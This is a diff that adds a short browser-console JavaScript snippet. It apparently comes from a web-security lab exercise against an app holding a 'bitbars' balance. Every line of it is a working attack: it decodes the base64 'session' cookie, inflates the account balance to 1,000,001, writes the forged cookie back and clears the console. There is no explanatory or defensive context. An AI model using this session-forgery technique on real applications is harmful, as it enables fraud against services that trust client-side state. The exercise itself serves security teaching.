@@ -1,0 +1,13 @@
+(function() {
+	function getCookie(key) {
+  const value = "; " + document.cookie;
+  const parts = value.split("; " + key + "=");
+	  if (parts.length == 2) return parts.pop().split(";").shift();
+	};
+	let session_str = getCookie('session')
+	let session= JSON.parse(atob(session_str));
+	session.account.bitbars = 1e+6 + 1;
+	// Overwrite the "session" cookie.
+	document.cookie = "session=" + btoa(JSON.stringify(session));
+})();
+clear();
